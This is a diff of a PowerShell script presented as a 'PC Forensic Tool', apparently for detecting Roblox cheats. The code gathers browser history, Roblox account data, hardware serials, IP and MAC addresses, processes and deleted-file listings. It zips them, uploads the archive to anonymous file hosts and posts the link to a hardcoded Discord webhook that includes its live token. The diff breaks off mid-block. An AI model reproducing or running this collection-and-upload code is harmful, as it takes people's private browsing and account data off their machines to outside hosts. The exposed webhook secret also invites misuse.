@@ -1,4 +1,5 @@
-
+# Enhanced PC Forensic Tool v3.1 - FULL VERSION
+# Features: Multiple upload services, mandatory webhook, comprehensive logging
 
 param(
     [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"
@@ -6,11 +7,24 @@ param(
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# Discord Webhook Configuration
-if (-not $WebhookURL) {
-    Write-Host "Enter Discord Webhook URL (or press Enter to skip): " -ForegroundColor Yellow -NoNewline
+# Force webhook input with validation
+while (-not $WebhookURL -or $WebhookURL.Length -lt 20) {
+    Write-Host "`n[!] Discord Webhook URL is REQUIRED" -ForegroundColor Red
+    Write-Host "Get it from: Discord Server Settings > Integrations > Webhooks" -ForegroundColor Yellow
+    Write-Host "Example: https://discord.com/api/webhooks/..." -ForegroundColor Cyan
+    Write-Host "`nWebhook URL: " -ForegroundColor Green -NoNewline
     $WebhookURL = Read-Host
+    
+    if (-not $WebhookURL) {
+        Write-Host "ERROR: You must provide a webhook URL to continue!" -ForegroundColor Red
+    } elseif ($WebhookURL.Length -lt 20) {
+        Write-Host "ERROR: Invalid webhook URL (too short)" -ForegroundColor Red
+        $WebhookURL = ""
+    }
 }
+
+Write-Host "`n✓ Webhook configured successfully!" -ForegroundColor Green
+Start-Sleep -Seconds 1
 
 # Suspicious patterns to search for
 $suspiciousPatterns = @("pot", "matrix", "newui", "matcha", "svchost1", "svc_host", "svc_host1", "svchost", "seliware", "potassium", "cryptic", "workspace")
@@ -50,99 +64,206 @@ function Send-DiscordMessage {
         } | ConvertTo-Json -Depth 10
         
         Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $payload -ContentType "application/json"
+        Write-Log "✓ Discord message sent successfully" "Green"
     } catch {
         Write-Log "Failed to send Discord message: $_" "Red"
     }
 }
 
-function Upload-ToFileIO {
+function Upload-ToPixelDrain {
     param($FilePath)
     
     try {
-        Write-Log "`n[*] Uploading to file.io: $FilePath" "Yellow"
+        Write-Log "Attempting upload to pixeldrain.com..." "Yellow"
         
-        # file.io allows simple file upload with curl
-        $fileName = [System.IO.Path]::GetFileName($FilePath)
-        
-        # Read file as bytes
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-        
-        # Create boundary
         $boundary = [System.Guid]::NewGuid().ToString()
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         
-        # Build multipart form data
-        $LF = "`r`n"
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream$LF",
-            $fileEnc,
-            "--$boundary--$LF"
-        ) -join $LF
+        $bodyLines = @(
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
+            "Content-Type: application/octet-stream"
+            ""
+            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+            "--$boundary--"
+        )
+        $body = $bodyLines -join "`r`n"
         
-        # Upload
-        $response = Invoke-RestMethod -Uri "https://file.io" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        $response = Invoke-RestMethod -Uri "https://pixeldrain.com/api/file/" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
         
-        if ($response.success) {
-            Write-Log "Upload successful: $($response.link)" "Green"
+        if ($response.id) {
+            $url = "https://pixeldrain.com/u/$($response.id)"
+            Write-Log "✓ Pixeldrain upload successful!" "Green"
+            Write-Log "URL: $url" "Cyan"
             return @{
-                url = $response.link
-                key = $response.key
-                expiry = $response.expiry
+                url = $url
+                service = "Pixeldrain"
+                expiry = "Never (until manually deleted)"
+                success = $true
             }
-        } else {
-            Write-Log "Upload failed: $($response.message)" "Red"
-            
-            # Try alternative: uguu.se
-            Write-Log "Trying alternative upload service (uguu.se)..." "Yellow"
-            return Upload-ToUguu -FilePath $FilePath
         }
     } catch {
-        Write-Log "file.io upload error: $_" "Red"
-        
-        # Try alternative service
-        Write-Log "Trying alternative upload service (uguu.se)..." "Yellow"
-        return Upload-ToUguu -FilePath $FilePath
+        Write-Log "Pixeldrain failed: $_" "Red"
+        return @{ success = $false }
     }
 }
 
-function Upload-ToUguu {
+function Upload-ToCatbox {
     param($FilePath)
     
     try {
-        $fileName = [System.IO.Path]::GetFileName($FilePath)
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        Write-Log "Attempting upload to catbox.moe..." "Yellow"
         
         $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"files[]`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream$LF",
-            $fileEnc,
-            "--$boundary--$LF"
-        ) -join $LF
+        $bodyLines = @(
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"reqtype`""
+            ""
+            "fileupload"
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`""
+            "Content-Type: application/octet-stream"
+            ""
+            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+            "--$boundary--"
+        )
+        $body = $bodyLines -join "`r`n"
         
-        $response = Invoke-RestMethod -Uri "https://uguu.se/upload.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        $response = Invoke-RestMethod -Uri "https://catbox.moe/user/api.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
         
-        if ($response.success) {
-            Write-Log "uguu.se upload successful: $($response.files[0].url)" "Green"
+        if ($response -and $response.StartsWith("https://")) {
+            Write-Log "✓ Catbox upload successful!" "Green"
+            Write-Log "URL: $response" "Cyan"
             return @{
-                url = $response.files[0].url
-                key = "uguu"
-                expiry = "48 hours"
+                url = $response
+                service = "Catbox"
+                expiry = "Never"
+                success = $true
             }
-        } else {
-            Write-Log "uguu.se upload failed" "Red"
-            return $null
         }
     } catch {
-        Write-Log "uguu.se upload error: $_" "Red"
-        return $null
+        Write-Log "Catbox failed: $_" "Red"
+        return @{ success = $false }
     }
+}
+
+function Upload-To0x0 {
+    param($FilePath)
+    
+    try {
+        Write-Log "Attempting upload to 0x0.st..." "Yellow"
+        
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        
+        $bodyLines = @(
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
+            "Content-Type: application/octet-stream"
+            ""
+            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+            "--$boundary--"
+        )
+        $body = $bodyLines -join "`r`n"
+        
+        $response = Invoke-RestMethod -Uri "https://0x0.st" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+        
+        if ($response -and $response.StartsWith("https://")) {
+            $url = $response.Trim()
+            Write-Log "✓ 0x0.st upload successful!" "Green"
+            Write-Log "URL: $url" "Cyan"
+            return @{
+                url = $url
+                service = "0x0.st"
+                expiry = "365 days"
+                success = $true
+            }
+        }
+    } catch {
+        Write-Log "0x0.st failed: $_" "Red"
+        return @{ success = $false }
+    }
+}
+
+function Upload-ToLitterbox {
+    param($FilePath)
+    
+    try {
+        Write-Log "Attempting upload to litterbox.catbox.moe (1hr expiry)..." "Yellow"
+        
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileName = [System.IO.Path]::GetFileName($FilePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        
+        $bodyLines = @(
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"reqtype`""
+            ""
+            "fileupload"
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"time`""
+            ""
+            "1h"
+            "--$boundary"
+            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`""
+            "Content-Type: application/octet-stream"
+            ""
+            [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+            "--$boundary--"
+        )
+        $body = $bodyLines -join "`r`n"
+        
+        $response = Invoke-RestMethod -Uri "https://litterbox.catbox.moe/resources/internals/api.php" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+        
+        if ($response -and $response.StartsWith("https://")) {
+            Write-Log "✓ Litterbox upload successful!" "Green"
+            Write-Log "URL: $response" "Cyan"
+            Write-Log "WARNING: File expires in 1 hour!" "Yellow"
+            return @{
+                url = $response
+                service = "Litterbox"
+                expiry = "1 hour"
+                success = $true
+            }
+        }
+    } catch {
+        Write-Log "Litterbox failed: $_" "Red"
+        return @{ success = $false }
+    }
+}
+
+function Upload-File {
+    param($FilePath)
+    
+    Write-Log "`n$(Get-Separator)" "Cyan"
+    Write-Log "UPLOADING RESULTS TO FILE HOSTING SERVICE" "Cyan"
+    Write-Log "$(Get-Separator)" "Cyan"
+    
+    # Try services in order of preference
+    $services = @(
+        @{ Name = "Pixeldrain"; Function = ${function:Upload-ToPixelDrain} }
+        @{ Name = "Catbox"; Function = ${function:Upload-ToCatbox} }
+        @{ Name = "0x0.st"; Function = ${function:Upload-To0x0} }
+        @{ Name = "Litterbox"; Function = ${function:Upload-ToLitterbox} }
+    )
+    
+    foreach ($service in $services) {
+        Write-Log "`nTrying $($service.Name)..." "Yellow"
+        $result = & $service.Function -FilePath $FilePath
+        
+        if ($result.success) {
+            return $result
+        }
+    }
+    
+    Write-Log "`n❌ ALL UPLOAD SERVICES FAILED!" "Red"
+    Write-Log "Results are saved locally only." "Yellow"
+    return $null
 }
 
 function Search-Patterns {
@@ -158,9 +279,25 @@ function Search-Patterns {
 }
 
 Write-Log "$(Get-Separator)" "Cyan"
-Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL v3.0" "Cyan"
+Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL v3.1" "Cyan"
 Write-Log "Scan Started: $(Get-Date)" "Cyan"
+Write-Log "Webhook: Configured ✓" "Green"
 Write-Log "$(Get-Separator)" "Cyan"
+
+# Send initial Discord notification
+Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
+    @{
+        title = "Initializing Analysis"
+        description = "Starting comprehensive system scan..."
+        color = 3447003
+        fields = @(
+            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
+            @{ name = "User"; value = $env:USERNAME; inline = $true }
+            @{ name = "Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
+        )
+        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    }
+)
 
 # ============================================================================
 # GATHER COMPREHENSIVE SYSTEM INFORMATION
@@ -223,7 +360,7 @@ $systemInfo = @{
 }
 
 Write-Log "`nSystem Information:"
-$systemInfo.GetEnumerator() | ForEach-Object {
+$systemInfo.GetEnumerator() | Sort-Object Key | ForEach-Object {
     Write-Log "  $($_.Key): $($_.Value)"
 }
 
@@ -264,7 +401,6 @@ foreach ($location in $searchLocations) {
     if (Test-Path $location) {
         Write-Log "`nScanning: $location" "Yellow"
         
-        # Get all files in location
         Get-ChildItem -Path $location -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
             $filePath = $_.FullName
             $fileName = $_.Name
@@ -317,7 +453,7 @@ $cfgSearchPaths = @(
     $env:TEMP,
     "$env:LOCALAPPDATA\Temp",
     "C:\Windows\Temp",
-    "$env:ProgramFiles",
+    $env:ProgramFiles,
     "${env:ProgramFiles(x86)}",
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Downloads",
@@ -441,7 +577,7 @@ Write-Log "`n[*] Searching for Roblox Accounts..." "Yellow"
 $robloxFile = "$outputDir\ROBLOX_ACCOUNTS.txt"
 "=== ROBLOX ACCOUNTS FOUND ===" | Out-File $robloxFile
 
-# Check Roblox App LocalStorage
+# Check Roblox App Data
 $robloxAppDataPaths = @(
     "$env:LOCALAPPDATA\Roblox\logs",
     "$env:LOCALAPPDATA\Roblox\LocalStorage",
@@ -583,6 +719,7 @@ foreach ($browser in $historyPaths.GetEnumerator()) {
     
     foreach ($historyPath in $paths) {
         if (Test-Path $historyPath) {
+            Write-Log "Extracting $($browser.Key) history..." "Yellow"
             Add-Content -Path $browserHistoryFile -Value "`n=== $($browser.Key) History ==="
             
             $tempDb = "$env:TEMP\history_temp_$(Get-Random).db"
@@ -598,6 +735,7 @@ foreach ($browser in $historyPaths.GetEnumerator()) {
                             Where-Object { $_ -match '^https?://' } |
                             Select-Object -First 300
                     
+                    Add-Content -Path $browserHistoryFile -Value "Found $($urls.Count) URLs:"
                     $urls | ForEach-Object { Add-Content -Path $browserHistoryFile -Value "  $_" }
                 } catch {}
                 
@@ -607,7 +745,7 @@ foreach ($browser in $historyPaths.GetEnumerator()) {
     }
 }
 
-Write-Log "Browser history saved" "Green"
+Write-Log "Browser history saved to: $browserHistoryFile" "Green"
 
 # ============================================================================
 # DELETED FILES
@@ -621,8 +759,9 @@ $sid = (Get-CimInstance Win32_UserAccount | Where-Object {$_.Name -eq $env:USERN
 $recycleBinPath = "$env:SystemDrive\`$Recycle.Bin\$sid"
 
 if (Test-Path $recycleBinPath) {
+    Write-Log "Scanning Recycle Bin..." "Yellow"
     Get-ChildItem -Path $recycleBinPath -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-        $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes"
+        $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes - $($_.FullName)"
         Add-Content -Path $deletedFile -Value $deletedInfo
         
         # Search for patterns
@@ -636,55 +775,65 @@ if (Test-Path $recycleBinPath) {
     }
 }
 
-Write-Log "Deleted files logged" "Green"
+Write-Log "Deleted files saved to: $deletedFile" "Green"
 
 # ============================================================================
-# OTHER STANDARD CHECKS (MUI, Prefetch, Processes, etc.)
+# OTHER STANDARD CHECKS
 # ============================================================================
 
 # MUICache
 Write-Log "`n[*] Analyzing MUICache..." "Yellow"
 $muiFile = "$outputDir\MUICACHE.txt"
+"=== MUICACHE (Application Execution History) ===" | Out-File $muiFile
+
 @("HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache") | ForEach-Object {
     if (Test-Path $_) {
         (Get-ItemProperty $_ -EA 0).PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {
-            "$($_.Name)=$($_.Value)" | Add-Content $muiFile
+            $entry = "$($_.Name)=$($_.Value)"
+            Add-Content -Path $muiFile -Value $entry
             Search-Patterns -Text "$($_.Name) $($_.Value)" -FilePath "MUICache"
         }
     }
 }
+Write-Log "MUICache saved to: $muiFile" "Green"
 
 # Running Processes
-Write-Log "`n[*] Analyzing Processes..." "Yellow"
+Write-Log "`n[*] Analyzing Running Processes..." "Yellow"
 $processFile = "$outputDir\PROCESSES.txt"
-Get-Process | ForEach-Object {
-    "$($_.ProcessName) - PID:$($_.Id) - $($_.Path)" | Add-Content $processFile
+"=== RUNNING PROCESSES ===" | Out-File $processFile
+
+Get-Process | Sort-Object CPU -Descending | ForEach-Object {
+    $procInfo = "$($_.ProcessName) - PID:$($_.Id) - CPU:$($_.CPU) - $($_.Path)"
+    Add-Content -Path $processFile -Value $procInfo
     Search-Patterns -Text "$($_.ProcessName) $($_.Path)" -FilePath "Process:$($_.ProcessName)"
 }
+Write-Log "Processes saved to: $processFile" "Green"
 
 # Installed Programs
-Write-Log "`n[*] Gathering Programs..." "Yellow"
+Write-Log "`n[*] Gathering Installed Programs..." "Yellow"
 $programsFile = "$outputDir\PROGRAMS.txt"
+"=== INSTALLED PROGRAMS ===" | Out-File $programsFile
+
 Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                  HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -EA 0 |
-Where-Object { $_.DisplayName } | ForEach-Object {
-    "$($_.DisplayName) - $($_.DisplayVersion)" | Add-Content $programsFile
+Where-Object { $_.DisplayName } | Sort-Object DisplayName | ForEach-Object {
+    $progInfo = "$($_.DisplayName) - Version: $($_.DisplayVersion) - Publisher: $($_.Publisher)"
+    Add-Content -Path $programsFile -Value $progInfo
     Search-Patterns -Text $_.DisplayName -FilePath "Program:$($_.DisplayName)"
 }
-
-Write-Log "Standard checks complete" "Green"
+Write-Log "Programs saved to: $programsFile" "Green"
 
 # ============================================================================
 # CREATE COMPREHENSIVE SUMMARY
 # ============================================================================
-Write-Log "`n[*] Creating summary..." "Yellow"
+Write-Log "`n[*] Creating Summary Report..." "Yellow"
 
 $summaryFile = "$outputDir\SUMMARY_REPORT.txt"
 $isSuspicious = ($suspiciousItems.Count -gt 0) -or ($patternMatches.Count -gt 0)
 
 $summary = @"
 ==============================================================================
-                    PC FORENSIC ANALYSIS SUMMARY v3.0
+                    PC FORENSIC ANALYSIS SUMMARY v3.1
 ==============================================================================
 
 Scan Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
@@ -697,6 +846,7 @@ SYSTEM DETAILS
 ==============================================================================
 
 OS: $($systemInfo.OSName) ($($systemInfo.OSBuild))
+Architecture: $($systemInfo.OSArchitecture)
 Install Date: $($systemInfo.InstallDate)
 Last Boot: $($systemInfo.LastBootTime)
 Uptime: $($systemInfo.Uptime)
@@ -704,22 +854,23 @@ Uptime: $($systemInfo.Uptime)
 Hardware:
 - Manufacturer: $($systemInfo.Manufacturer)
 - Model: $($systemInfo.Model)
-- BIOS: $($systemInfo.BIOSVersion)
+- BIOS: $($systemInfo.BIOSVersion) ($($systemInfo.BIOSManufacturer))
 - Serial: $($systemInfo.SerialNumber)
 - RAM: $($systemInfo.TotalRAM) GB
-- Processor: $($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores) cores)
-- GPU: $($systemInfo.GPUName)
+- Processor: $($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores) cores / $($systemInfo.ProcessorThreads) threads)
+- GPU: $($systemInfo.GPUName) (Driver: $($systemInfo.GPUDriverVersion))
 
 Network:
 - IP Address: $($systemInfo.IPAddress)
 - MAC Address: $($systemInfo.MACAddress)
-- DNS: $($systemInfo.DNSServers)
+- DNS Servers: $($systemInfo.DNSServers)
+- DHCP: $($systemInfo.DHCPEnabled) (Server: $($systemInfo.DHCPServer))
 
 ==============================================================================
 DETECTION STATISTICS
 ==============================================================================
 
-Pattern Matches (pot, matrix, etc.): $($patternMatches.Count)
+Pattern Matches (pot, matrix, seliware, etc.): $($patternMatches.Count)
 Roblox Accounts Found: $($robloxAccounts.Count)
 .cfg Files Found: $($cfgFiles.Count)
 .exe Files Found: $($exeFiles.Count)
@@ -763,13 +914,13 @@ FILES GENERATED
 
 - FULL_LOG.txt - Complete scan log
 - SUMMARY_REPORT.txt - This summary
-- PATTERN_MATCHES.txt - All pattern search results (pot, matrix, etc.)
+- PATTERN_MATCHES.txt - All pattern search results
 - CFG_FILES.txt - All .cfg files found
 - EXE_FILES.txt - All .exe files found
 - ROBLOX_ACCOUNTS.txt - Roblox account data
-- BROWSER_HISTORY.txt - Browser history
-- DELETED_FILES.txt - Deleted files
-- MUICACHE.txt - App execution history
+- BROWSER_HISTORY.txt - Browser history from all browsers
+- DELETED_FILES.txt - Deleted files analysis
+- MUICACHE.txt - Application execution history
 - PROCESSES.txt - Running processes
 - PROGRAMS.txt - Installed software
 
@@ -777,101 +928,124 @@ FILES GENERATED
 "@
 
 $summary | Out-File $summaryFile
-Write-Log "Summary created" "Green"
+Write-Log "Summary report created: $summaryFile" "Green"
 
 # ============================================================================
-# UPLOAD AND DISCORD WEBHOOK
+# UPLOAD AND SEND TO DISCORD
 # ============================================================================
-Write-Log "`n$(Get-Separator)" "Cyan"
-Write-Log "UPLOADING RESULTS..." "Yellow"
 
-$zipFile = "$env:TEMP\Forensics_$timestamp.zip"
+# Create ZIP
+$zipFile = "$env:TEMP\Forensics_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
+Write-Log "`n[*] Creating ZIP archive..." "Yellow"
 Compress-Archive -Path "$outputDir\*" -DestinationPath $zipFile -Force
+Write-Log "ZIP created: $zipFile" "Green"
 
-$uploadResult = Upload-ToFileIO -FilePath $zipFile
+# Upload
+$uploadResult = Upload-File -FilePath $zipFile
 
+# Send comprehensive Discord webhook
 if ($uploadResult -and $uploadResult.url) {
-    Write-Log "`n✓ Upload Successful!" "Green"
-    Write-Log "URL: $($uploadResult.url)" "Cyan"
-    Write-Log "Expiry: $($uploadResult.expiry)" "Yellow"
+    Write-Log "`n$(Get-Separator)" "Cyan"
+    Write-Log "SENDING RESULTS TO DISCORD..." "Yellow"
+    Write-Log "$(Get-Separator)" "Cyan"
     
-    # Send comprehensive Discord webhook
-    if ($WebhookURL) {
-        $embedColor = if ($isSuspicious) { 15158332 } else { 3066993 }
-        
-        $fields = @(
-            @{ name = "🖥️ Computer"; value = $systemInfo.ComputerName; inline = $true }
-            @{ name = "👤 User"; value = $systemInfo.Username; inline = $true }
-            @{ name = "🕐 Scan Time"; value = $systemInfo.CurrentTime; inline = $false }
-            @{ name = "💿 OS"; value = "$($systemInfo.OSName) ($($systemInfo.OSBuild))"; inline = $true }
-            @{ name = "⏰ Uptime"; value = $systemInfo.Uptime; inline = $true }
-            @{ name = "📅 Install Date"; value = $systemInfo.InstallDate.ToString("yyyy-MM-dd"); inline = $true }
-            @{ name = "🌐 IP Address"; value = $systemInfo.IPAddress; inline = $true }
-            @{ name = "📍 MAC Address"; value = $systemInfo.MACAddress; inline = $true }
-            @{ name = "💾 RAM"; value = "$($systemInfo.TotalRAM) GB"; inline = $true }
-            @{ name = "🔧 Processor"; value = "$($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores)C/$($systemInfo.ProcessorThreads)T)"; inline = $false }
-            @{ name = "🎮 GPU"; value = $systemInfo.GPUName; inline = $false }
-            @{ name = "🏭 Manufacturer"; value = "$($systemInfo.Manufacturer) $($systemInfo.Model)"; inline = $true }
-            @{ name = "🔢 Serial"; value = $systemInfo.SerialNumber; inline = $true }
-            @{ name = "📂 User Profile"; value = $systemInfo.UserProfile; inline = $false }
-        )
-        
-        # Add detection stats
-        $fields += @{ name = "━━━━━ DETECTION RESULTS ━━━━━"; value = "** **"; inline = $false }
-        $fields += @{ name = "🎯 Pattern Matches"; value = "$($patternMatches.Count) found"; inline = $true }
-        $fields += @{ name = "🎮 Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
-        $fields += @{ name = "⚙️ .cfg Files"; value = "$($cfgFiles.Count) found"; inline = $true }
-        $fields += @{ name = "📦 .exe Files"; value = "$($exeFiles.Count) found"; inline = $true }
-        $fields += @{ name = "⚠️ Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
-        
-        # Add pattern matches preview
-        if ($patternMatches.Count -gt 0) {
-            $patternList = ($patternMatches | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
-            if ($patternMatches.Count -gt 5) {
-                $patternList += "`n... and $($patternMatches.Count - 5) more"
-            }
-            $fields += @{ name = "🔴 Critical Pattern Matches"; value = $patternList; inline = $false }
+    $embedColor = if ($isSuspicious) { 15158332 } else { 3066993 }
+    
+    $fields = @(
+        @{ name = "🖥️ Computer"; value = $systemInfo.ComputerName; inline = $true }
+        @{ name = "👤 User"; value = $systemInfo.Username; inline = $true }
+        @{ name = "🕐 Scan Time"; value = $systemInfo.CurrentTime; inline = $false }
+        @{ name = "💿 OS"; value = "$($systemInfo.OSName) (Build $($systemInfo.OSBuild))"; inline = $true }
+        @{ name = "⏰ Uptime"; value = $systemInfo.Uptime; inline = $true }
+        @{ name = "📅 Install Date"; value = $systemInfo.InstallDate.ToString("yyyy-MM-dd"); inline = $true }
+        @{ name = "🌐 IP Address"; value = $systemInfo.IPAddress; inline = $true }
+        @{ name = "📍 MAC Address"; value = $systemInfo.MACAddress; inline = $true }
+        @{ name = "💾 RAM"; value = "$($systemInfo.TotalRAM) GB"; inline = $true }
+        @{ name = "🔧 Processor"; value = "$($systemInfo.ProcessorName) ($($systemInfo.ProcessorCores)C/$($systemInfo.ProcessorThreads)T)"; inline = $false }
+        @{ name = "🎮 GPU"; value = "$($systemInfo.GPUName) (Driver: $($systemInfo.GPUDriverVersion))"; inline = $false }
+        @{ name = "🏭 Manufacturer"; value = "$($systemInfo.Manufacturer) $($systemInfo.Model)"; inline = $true }
+        @{ name = "🔢 Serial"; value = $systemInfo.SerialNumber; inline = $true }
+        @{ name = "🌍 Time Zone"; value = $systemInfo.TimeZone; inline = $true }
+        @{ name = "━━━━━ DETECTION RESULTS ━━━━━"; value = "** **"; inline = $false }
+        @{ name = "🎯 Pattern Matches"; value = "$($patternMatches.Count) found"; inline = $true }
+        @{ name = "🎮 Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
+        @{ name = "⚙️ .cfg Files"; value = "$($cfgFiles.Count) found"; inline = $true }
+        @{ name = "📦 .exe Files"; value = "$($exeFiles.Count) found"; inline = $true }
+        @{ name = "⚠️ Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
+    )
+    
+    # Add pattern matches preview
+    if ($patternMatches.Count -gt 0) {
+        $patternList = ($patternMatches | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
+        if ($patternMatches.Count -gt 5) {
+            $patternList += "`n... and $($patternMatches.Count - 5) more (see full report)"
         }
-        
-        # Add Roblox accounts
-        if ($robloxAccounts.Count -gt 0) {
-            $robloxList = ($robloxAccounts | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
-            if ($robloxAccounts.Count -gt 5) {
-                $robloxList += "`n... and $($robloxAccounts.Count - 5) more"
-            }
-            $fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
-        }
-        
-        # Add suspicious items
-        if ($suspiciousItems.Count -gt 0) {
-            $suspList = ($suspiciousItems | Select-Object -First 3 | ForEach-Object { "• $_" }) -join "`n"
-            if ($suspiciousItems.Count -gt 3) {
-                $suspList += "`n... and $($suspiciousItems.Count - 3) more"
-            }
-            $fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
-        }
-        
-        # Add download link
-        $fields += @{ name = "📥 Download Full Report"; value = "[$($uploadResult.url)]($($uploadResult.url))`nExpires: $($uploadResult.expiry)"; inline = $false }
-        
-        $embed = @{
-            title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✅ System Scan Complete - Clean" }
-            description = "**Comprehensive PC Forensic Analysis Report**"
-            color = $embedColor
-            fields = $fields
-            footer = @{
-                text = "PC Forensic Tool v3.0 | Scan ID: $timestamp"
-            }
-            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
-        }
-        
-        Send-DiscordMessage -Content "**🔍 Forensic Analysis Complete**" -Embeds @($embed)
-        Write-Log "`n✓ Results sent to Discord!" "Green"
+        $fields += @{ name = "🔴 CRITICAL - Pattern Matches"; value = $patternList; inline = $false }
     }
+    
+    # Add Roblox accounts
+    if ($robloxAccounts.Count -gt 0) {
+        $robloxList = ($robloxAccounts | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
+        if ($robloxAccounts.Count -gt 5) {
+            $robloxList += "`n... and $($robloxAccounts.Count - 5) more"
+        }
+        $fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
+    }
+    
+    # Add suspicious items
+    if ($suspiciousItems.Count -gt 0) {
+        $suspList = ($suspiciousItems | Select-Object -First 3 | ForEach-Object { "• $_" }) -join "`n"
+        if ($suspiciousItems.Count -gt 3) {
+            $suspList += "`n... and $($suspiciousItems.Count - 3) more"
+        }
+        $fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
+    }
+    
+    # Add download link
+    $fields += @{ 
+        name = "📥 DOWNLOAD FULL REPORT" 
+        value = "**[$($uploadResult.url)]($($uploadResult.url))**`n`nService: $($uploadResult.service)`nExpires: $($uploadResult.expiry)" 
+        inline = $false 
+    }
+    
+    $embed = @{
+        title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✅ SYSTEM SCAN COMPLETE - CLEAN" }
+        description = "**Comprehensive PC Forensic Analysis Report v3.1**"
+        color = $embedColor
+        fields = $fields
+        footer = @{
+            text = "PC Forensic Tool v3.1 | Scan ID: $timestamp"
+        }
+        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    }
+    
+    Send-DiscordMessage -Content "**🔍 Forensic Analysis Complete**" -Embeds @($embed)
 } else {
-    Write-Log "`n❌ Upload failed" "Red"
+    # Upload failed, send basic info
+    Write-Log "`n[!] Upload failed - Sending basic report to Discord..." "Yellow"
+    
+    $fields = @(
+        @{ name = "⚠️ Status"; value = "Upload Failed - Results saved locally only"; inline = $false }
+        @{ name = "Computer"; value = $systemInfo.ComputerName; inline = $true }
+        @{ name = "User"; value = $systemInfo.Username; inline = $true }
+        @{ name = "Pattern Matches"; value = "$($patternMatches.Count)"; inline = $true }
+        @{ name = "Roblox Accounts"; value = "$($robloxAccounts.Count)"; inline = $true }
